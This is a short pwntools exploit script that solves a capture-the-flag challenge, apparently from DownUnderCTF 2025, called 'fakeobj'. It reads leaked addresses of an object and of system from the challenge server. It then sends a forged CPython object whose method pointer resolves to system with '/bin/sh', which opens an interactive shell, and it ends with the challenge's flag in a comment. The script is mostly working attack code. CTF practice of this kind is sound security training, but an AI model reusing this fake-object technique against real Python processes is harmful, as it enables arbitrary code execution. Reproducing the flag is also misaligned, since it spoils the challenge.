#!/usr/bin/env python3

from pwn import *

# https://github.com/python/cpython/blob/main/Objects/dictobject.c
# https://chatgpt.com/share/687a2e2f-8340-8000-b0fd-a93b99a781e9

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
b *Py_RunMain
'''

p = remote("chal.2025.ductf.net", 30001)
#p = process('./fakeobj.py')
#p = gdb.debug('./fakeobj.py', gdbscript = script)
#debug()

rcu(b"addrof(obj) = ")
obj_addr = int(p.recvline(), 16)
rcu(b"system = ")
system = int(p.recvline(), 16)

lleak("obj", obj_addr)
lleak("system", system)

fp = b".bin/sh\x00" + p64(obj_addr + 0x40 - 0x88)
fp = fp.ljust(0x40, b"\x00")
fp += p64(system)

hex_str = fp.hex()
payload = hex_str.encode()

sla(b"fakeobj: ", payload)

p.interactive()
#DUCTF{what_do_you_call_a_snake_that_bakes?_a_pie-thon!}